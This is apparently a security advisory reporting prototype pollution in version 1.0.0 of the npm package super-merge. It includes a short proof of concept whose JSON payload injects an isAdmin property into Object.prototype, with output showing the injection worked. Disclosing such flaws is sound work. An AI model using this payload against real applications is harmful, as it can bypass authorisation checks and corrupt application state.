# 🚨 Prototype Pollution in [super-merge](https://www.npmjs.com/package/super-merge) 


Version: 1.0.0


## 📝 Description
The super-merge package is designed to deeply merge two JavaScript objects or arrays. However, the recursive merge logic does not sanitize or block the __proto__ property, a known vector for prototype pollution attacks.

By supplying a malicious object containing the __proto__ key, an attacker can inject arbitrary properties into the global Object.prototype. This affects all objects inheriting from Object within the application context.


## 💥 Proof of Concept (PoC)

```js
import superMerge from 'super-merge';

console.log('Before:', {}.isAdmin);

const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

superMerge({}, malicious);

console.log('After:', {}.isAdmin);
```

✅ Output

Before: undefined

After: true

This proves that the isAdmin property was successfully injected into the global prototype, affecting any newly created or existing object without a direct assignment.

